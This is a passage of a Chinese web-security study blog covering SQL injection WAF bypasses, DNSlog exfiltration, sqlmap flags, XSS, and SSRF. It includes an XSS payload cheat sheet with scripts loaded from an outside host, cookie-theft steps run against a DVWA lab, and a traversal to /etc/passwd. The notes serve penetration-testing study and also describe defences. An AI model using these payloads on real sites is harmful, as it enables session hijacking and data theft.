&#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F; &#x2F;*****!23144by*&#x2F; 1–+</p></blockquote><blockquote><p>字符型绕过：</p><p><code>1&#39;/case when 1=1 then &#39;1&#39; else &#39;0&#39; end--+ </code></p><p><code>1&#39;/case when 1=1 then 1 else 0 end--+</code></p></blockquote><p>· 如果被拦截了，尝试使用<code>if</code>语句：</p><blockquote><p>if(1&#x3D;1,1,0)</p><p>if(1&#x3D;0,1,0)</p></blockquote><p>如果条件为真页面返回正常，注入成功，为假页面返回异常的话。那就表明if语句绕过成功了。</p><p>· 先判断数据库长度：<code>if(length(database())&gt;0,1,0)</code></p><p>· 若被拦截，使用字符替换其中的<code>database()</code>验证是否是该函数被拦截。<code>if(length(&#39;abc&#39;)&gt;0,1,0)</code></p><p>· 若返回页面正常，则表示是其中的<code>database()</code>被拦截</p><p>· 使用<code>内联绕过</code>：<code>if(length(/*!06440database*/())%3E0,1,0)</code>其中，<code>%3E</code>表示<code>&gt; </code>符号，将函数名使用内联注释符框住，执行。</p><p>· 正常来说，如此便会成功绕过。（不会被拦截啦）</p><p>· 之后就是执行参数污染等操作了：</p><blockquote><p><code>/**&amp;id=-1 union select 1,2,3#*/ </code></p><p><code>/**-1 union select 1,2,3#*/ </code></p><p><code>/***/</code></p></blockquote><h4 id="5、DNS外带SQL注入（属于mysql盲注）"><a href="#5、DNS外带SQL注入（属于mysql盲注）" class="headerlink" title="5、DNS外带SQL注入（属于mysql盲注）"></a>5、DNS外带SQL注入（属于mysql盲注）</h4><p>使用场景：无法通过联合查询直接获取数据的情况下，注入时无回显时，可尝试使用 DNSlog 外带注入。</p><p>用途：用于在SQL注入攻击中绕过防火墙和安全措施，以获取更多的信息。</p><p>利用条件：①DNSlog外带要用到 Load_file()函数，需要当前数据库用户有读权限。②设置 <code>secure_file_priv</code>为空。查询权限的语句为：<code>select file_priv from mysql.user where user=&#39;&#39;</code></p><blockquote><p>DNSlog注入的原理大致为：当我们输入域名时，会向DNS服务器解析获取IP在通过IP访问，在这过程中DNS服务器会产生对域名请求解析的日志，比如此时存在一个域名为<code>summer.com</code>，要使用的payload为<code>whoami.summer.com</code>，就可以通过DNS解析日志来获取到主机名。</p></blockquote><p><a href="https://www.freebuf.com/articles/web/323674.html">mysql盲注之dns外带注入</a></p><p><a href="https://blog.csdn.net/weixin_48083470/article/details/119379081">DNSlog注入 信息的 带外|外带 sql注入利用详解+实操</a></p><h4 id="6、sqlmap使用"><a href="#6、sqlmap使用" class="headerlink" title="6、sqlmap使用"></a>6、sqlmap使用</h4><p>先验知识：</p><blockquote><p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</p></blockquote><p><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">Sqlmap使用指南</a></p><p><a href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">SQLmap使用教程图文教程</a></p><p>常用表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a, --all           检索所有内容<br>   -b, --banner        检索DBMS横幅<br>   --current-user      检索DBMS当前用户<br>   --current-db        检索DBMS当前数据库<br>   --hostname          检索DBMS服务器主机名<br>   --is-dba            检测DBMS当前用户是否为DBA<br>   --<span class="hljs-built_in">users</span>             枚举DBMS用户<br>   --passwords         枚举DBMS用户密码哈希值<br>   --privileges        枚举DBMS用户权限<br>   --roles             枚举DBMS用户角色<br>   --dbs               枚举DBMS数据库<br>   --tables            枚举DBMS数据库表<br>   --columns           枚举DBMS数据库表列<br>   --schema            枚举DBMS模式<br>   --count             检索表的条目数<br>   --dump              转储DBMS数据库表条目<br>   --dump-all          转储所有DBMS数据库表条目<br>   --search            搜索列、表和/或数据库名称<br>   --comments          在枚举过程中检查DBMS注释<br>   --statements        检索在DBMS上运行的SQL语句<br>   -D DB               要枚举的DBMS数据库<br>   -T TBL              要枚举的DBMS数据库表<br>   -C COL              要枚举的DBMS数据库表列<br>   -X EXCLUDE          不要枚举的DBMS数据库标识符<br>   -U USER             要枚举的DBMS用户<br>   --exclude-sysdbs    在枚举表时排除DBMS系统数据库<br>   --pivot-column=P..  枢轴列名称<br>   --<span class="hljs-built_in">where</span>=DUMPWHERE   在转储表时使用WHERE条件<br>   --start=LIMITSTART  要检索的第一个转储表条目<br>   --stop=LIMITSTOP    要检索的最后一个转储表条目<br>   --first=FIRSTCHAR   要检索的第一个查询输出单词字符<br>   --last=LASTCHAR     要检索的最后一个查询输出单词字符<br>   --sql-query=SQLQ..  要执行的SQL语句<br>   --sql-shell         提示进行交互式SQL shell<br>   --sql-file=SQLFILE  从给定文件中执行SQL语句<br><br></code></pre></td></tr></table></figure><h3 id="②XSS跨站脚本攻击"><a href="#②XSS跨站脚本攻击" class="headerlink" title="②XSS跨站脚本攻击"></a>②XSS跨站脚本攻击</h3><h4 id="1、漏洞简介"><a href="#1、漏洞简介" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><ul><li><p>XSS，跨站脚本攻击，是指恶意攻击者网<code>web页面</code>中<code>插入恶意代码</code>，当用户<code>浏览该网页时</code>，嵌入其中的恶意代码就会被执行，从而达到攻击者的目的。</p></li><li><p>XSS属于被动攻击。最大的特点是，能注入恶意的html&#x2F;JavaScript代码到用户浏览的网页上，从而达到的挟持用户会话的目的。</p></li><li><p>危害：窃取用户&#x2F;管理员的cookie非法登陆；网站挂马（将恶意木马代码插入到web页面中，用户访问页面目标计算机就会被植入木马）；发送广告或垃圾信息。</p></li></ul><h4 id="2、漏洞类型"><a href="#2、漏洞类型" class="headerlink" title="2、漏洞类型"></a>2、漏洞类型</h4><p><strong>主要分为三种类型：</strong></p><h5 id="反射类XSS（非持久型XSS）"><a href="#反射类XSS（非持久型XSS）" class="headerlink" title="反射类XSS（非持久型XSS）"></a>反射类XSS（非持久型XSS）</h5><p>攻击者需要通过<code>诱使用户点击</code>包含XSS攻击代码的恶意链接，接着用户方的浏览器就会执行恶意代码触发XSS漏洞。</p><p>· 利用：常见的利用方法是在URL中构造，将恶意链接发送给目标用户。（当用户访问该链接时，其浏览器会向服务器发起一个GET请求来提交带有恶意代码的链接，在浏览器中解析）</p><p>· 一般情况下，反射性XSS存在于搜索框，<code>通过URL控制页面的输出</code>。简而言之为，将参数传入服务器，再由服务器输出出来。</p><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>攻击者需要事先将javascript<code>代码上传或存储</code>到存在漏洞的服务器中。当受害者浏览包含此恶意Javascript代码的页面时便会触发恶意代码。</p><p>· 利用：需要将恶意代码上传至服务器中。</p><p><a href="https://blog.csdn.net/weixin_45842420/article/details/123450070">本地代码上传到服务器</a></p><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>它是一种特殊的反射型XSS。</p><p>· DOM树，文档对象模型，web前端开发中常使用到的模型。</p><p>· 主要由客户端的脚本程序通过DOM动态地输出数据到页面，而非依赖于将数据提交给服务器端。明白说来是，js脚本从url中获取数据并将其传递到<code>支持动态代码执行的接收器</code>时，就会产生DOM-XSS漏洞。咦？DOM-XSS一般产生于<code>用户能够进行参数输入查询的地方</code>（比如搜索框捏）。</p><p>· 常见的接收器：</p><blockquote><p>document.write()<br>document.writeln()<br>document.domain<br>someDOMElement.innerHTML<br>someDOMElement.outerHTML<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p></blockquote><p>· 演示范例：<a href="https://blog.csdn.net/vodkaDL/article/details/111570321">Web渗透测试之XSS攻击：基于DOM的XSS</a></p><p><a href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM-XSS攻击原理与防御</a></p><h4 id="3、常用XSS语句"><a href="#3、常用XSS语句" class="headerlink" title="3、常用XSS语句"></a>3、常用XSS语句</h4><p><a href="https://www.cnblogs.com/xfbk/p/17936998">XSS注入测试思路+通用语句</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(<span class="hljs-string">&#x27;hello，gaga!&#x27;</span>);&lt;/script&gt; //经典语句!<br> <br>&gt;<span class="hljs-string">&quot;&#x27;&gt;&lt;img src=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&gt;&quot;</span><span class="hljs-string">&#x27;&gt;&lt;script&gt;alert(&#x27;</span>XSS<span class="hljs-string">&#x27;)&lt;/script&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;table background=&#x27;</span>javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br> <br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br> <br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br> <br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br> <br>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br> <br>&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br> <br>%<span class="hljs-number">3</span>c/a%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>c/title%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e/index.html<br> <br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&quot;XSS&quot;)&gt;<br> <br>&lt;IMG SRC=&quot;jav    ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&quot;&lt;IMG src=&quot;/java&quot;\<span class="hljs-number">0</span>script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br> <br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br> <br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br> <br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br> <br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br> <br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;<span class="hljs-number">0</span>;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br> <br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br> <br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>behaviour: url(<span class="hljs-string">&#x27;http://www.how-to-hack.org/exploit.html&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>width: expression(alert(<span class="hljs-string">&#x27;XSS&#x27;</span>));<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;</span>XSS<span class="hljs-string">&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;</span>XSS<span class="hljs-string">&quot;))&#x27;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/javascript<span class="hljs-string">&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/css<span class="hljs-string">&quot;&gt;.XSS&#123;background-image:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. type=&quot;</span>text/css<span class="hljs-string">&quot;&gt;BODY&#123;background:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;BASE HREF=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);//<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">getURL(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">a=&quot;</span>get<span class="hljs-string">&quot;;b=&quot;</span>URL<span class="hljs-string">&quot;;c=&quot;</span>javascript.:<span class="hljs-string">&quot;;d=&quot;</span>alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;;eval(a+b+c+d);</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;XML SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&quot;</span>&gt; &lt;BODY NLOAD=<span class="hljs-string">&quot;a();&quot;</span>&gt;&lt;SCRIPT&gt;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">a</span></span>()&#123;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);&#125;&lt;/SCRIPT&gt;&lt;<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. SRC=&quot;</span>http://xss.ha.ckers.org/xss.jpg<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;&#x27;&#x27;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.&quot;</span>a=<span class="hljs-string">&#x27;&gt;&#x27;</span><span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT&gt;document.write(&quot;</span>&lt;SCRI<span class="hljs-string">&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br></code></pre></td></tr></table></figure><h4 id="4、XSS防御"><a href="#4、XSS防御" class="headerlink" title="4、XSS防御"></a>4、XSS防御</h4><ul><li><strong>验证</strong></li></ul><p><strong>思路：</strong>过滤用户输入，使浏览器解释代码而非恶意命令。其中，最重要的是过滤和净化有害的输入，如常见的敏感字符<code>&lt;&gt; &#39; &quot; &amp; # javascript</code>等。</p><ul><li><strong>编码</strong></li></ul><p><strong>思路：</strong>转义用户输入，使得浏览器仅解释数据而非代码。</p><blockquote><p>HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体替代字符，这样做可确保浏览器安全处理可能存在的恶意字符，将其当作HTML文档的内容而非结构加以处理。</p><p>一些常见的可能造成问题的字符的HTML编码如下所示：</p><p><code>显示</code><code>实体名字</code><code>实体编号</code></p><p><code>&lt;</code><code>&amp;lt;</code><code>&amp;#60;</code></p><p><code>&gt;</code><code>&amp;gt;</code><code>&amp;#62;</code></p><p><code>&amp;</code><code>&amp;amp;</code>   <code>&amp;#38;</code></p><p><code>&quot;</code><code>&amp;quot;</code> <code>&amp;#34;</code></p></blockquote><ul><li><strong>XSS Filter（自编写脚本啦）</strong></li></ul><p>XSS Filter是防御跨站脚本攻击的主要手段之一，其作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。</p><p><a href="https://blog.csdn.net/qq_38118138/article/details/118081903">XSS过滤器Filter实现全过程</a></p><p><a href="https://blog.csdn.net/Code_shadow/article/details/103125060">使用Filter进行XSS过滤</a></p><h4 id="5、XSS绕过"><a href="#5、XSS绕过" class="headerlink" title="5、XSS绕过"></a>5、XSS绕过</h4><h6 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h6><p>HTML对标签大小写不敏感，可以利用大小写混用绕过。</p><p>例如：<code>&lt;script&gt;改为&lt;ScRiPt&gt;</code></p><h6 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h6><p>有些情况下的规则会将黑名单标签替换为空，可以利用这一点构造标签。</p><p>例如：<code>&lt;script&gt;改为&lt;scr&lt;script&gt;ipt&gt;</code></p><p>同理，某些注释符在规则中也会替换为空，这时候可以利用它构造payload。</p><p>例如：<code>&lt;script&gt;改为&lt;scr&lt;!---test---&gt;ipt&gt;</code></p><h6 id="开口标签"><a href="#开口标签" class="headerlink" title="开口标签"></a>开口标签</h6><p>在某些特殊环境，由于html代码的补全机制，可以故意<code>不闭合标签</code>绕过黑名单检测例如：<code>&lt;script&gt;改为&lt;script</code></p><h6 id="空格回车Tab"><a href="#空格回车Tab" class="headerlink" title="空格回车Tab"></a>空格回车Tab</h6><p>例如：js伪协议<code>javascript:alert(&#39;xss&#39;);</code>可以改为<code>java script:alert(&#39;xss&#39;);</code>等</p><h6 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h6><p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码。</p><blockquote><p>href、action、formaction、location、on*、name、background、poster</p></blockquote><h6 id="绕Waf"><a href="#绕Waf" class="headerlink" title="绕Waf"></a>绕Waf</h6><p>在url上添加代码：<code>&lt;Script sRC=&#39;//xxx/xx&#39;#ewqeqweq</code>，其中，空格可以使用<code>+</code>，其它的如果需要转义的话自行百度查询吧。</p><h6 id="使用其它标签（Waf）"><a href="#使用其它标签（Waf）" class="headerlink" title="使用其它标签（Waf）"></a>使用其它标签（Waf）</h6><blockquote><p><code>&lt;svg/onload = alert(1);&gt;</code></p></blockquote><h4 id="6、伪造身份登陆（XSS获取cookie并利用）"><a href="#6、伪造身份登陆（XSS获取cookie并利用）" class="headerlink" title="6、伪造身份登陆（XSS获取cookie并利用）"></a>6、伪造身份登陆（XSS获取cookie并利用）</h4><blockquote><p>实现流程：</p><p>1、注册一个在线xss平台账号，<a href="https://xss.yt/">https://xss.yt</a></p><p>2、创建项目，获取自己对应的XSS payload（其中的项目名称和项目描述随便写）</p><p>3、选择默认模块，默认模块是读取cookie，下一步。（可以选择超强默认模块啦，无需配置keepsession）</p><p>4、然后就会出现一些可植入js代码（可利用）</p><p>5、然后，使用浏览器打开dvwa靶场，将安全级别调到low。选择反射性xss，将上面的js代码复制一个到输入框中，进行测试。</p><p>6、回到xss平台，查看内容。展开，会发现登陆用的cookie</p><p>7、获取到cookie后，打开另外一个浏览器访问dvwa(模拟攻击者操作)，f12打开开发者工具，在”存储“中找到cookie值，记录其<code>PHPSESSION</code>值</p><p>8、将之前获取到的cookie值替换上去，把security的impossible改为low,回到登录界面，在url后面加上获取到的cookie信息（cookie&#x3D;security&#x3D;low; PHPSESSION&#x3D;记下的内容）。ps：url改为后台地址（cookie下的url地址）</p></blockquote><h3 id="③SSRF服务器端请求伪造"><a href="#③SSRF服务器端请求伪造" class="headerlink" title="③SSRF服务器端请求伪造"></a>③SSRF服务器端请求伪造</h3><h4 id="1、漏洞简介-1"><a href="#1、漏洞简介-1" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>· SSRF，服务器端请求伪造，是由攻击者构造请求，但由服务端发起请求的安全漏洞。本质上属于信息泄露漏洞。</p><p>· SSRF攻击的目标是：<code>从外网无法访问的内部系统</code>。（因为其由服务器端发起，所以它能够请求到与它相连而与外网隔离的内部系统，也就是把目标网站当作中间人）</p><p>· SSRF 形成的原因：<code>大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制 </code>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p><p>· 数据流：<code>攻击者</code>—-<code>服务器</code>—-<code>目标地址</code></p><blockquote><p><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议）</a></p><p><a href="https://blog.csdn.net/qq_44159028/article/details/114626708">SSRF (服务器端请求伪造) 漏洞原理与利用方式</a></p><p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF-有面试相关内容</a></p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御-协议方面比较完善</a></p><p><a href="https://www.freebuf.com/vuls/365150.html">手把手用实战教你SSRF漏洞从入门到精通</a></p></blockquote><h4 id="2、漏洞产生"><a href="#2、漏洞产生" class="headerlink" title="2、漏洞产生"></a>2、漏洞产生</h4><h5 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h5><p>php中的以下函数使用不当容易导致SSRF：</p><ul><li><strong>file_get_contents()和readfile()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>// 传入URL地址<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];   <br>// 从URL地址中读取指定内容，并直接输出<br><span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);  <br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>file_get_content</code>函数从用户指定的url读取整个文件内容，然后直接使用echo命令输出展现给用户。</p><p>file_put_content()函数的作用是读取文件内容或者URL地址指定的内容。</p><p>！当传入的参数是内网文件的路径时（如在原url上添加构造路径<code>ssrf.php?url=../../../../../../etc/passwd</code>），就会造成文件读取，信息泄露 。一般这种攻击与目录遍历相结合。</p></blockquote><ul><li><strong>fsockopen()</strong></li></ul><figure class="highlight bash"><table><tr><td 